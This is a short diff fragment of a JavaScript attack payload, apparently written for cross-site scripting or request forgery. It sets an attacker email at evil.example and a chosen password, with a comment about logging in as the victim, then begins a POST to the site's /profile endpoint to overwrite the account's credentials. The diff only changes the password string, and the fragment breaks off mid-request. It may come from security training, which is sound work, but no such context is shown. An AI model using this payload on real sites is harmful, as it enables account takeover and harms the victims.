@@ -15,7 +15,7 @@
  */
 (function () {
   var NEW_EMAIL = "attacker@evil.example";
-  var NEW_PASSWORD = "pwned-by-A2";   // attacker-chosen; log in as the victim afterwards
+  var NEW_PASSWORD = "hello";   // attacker-chosen; log in as the victim afterwards
 
   fetch("/profile", {
     method: "POST",
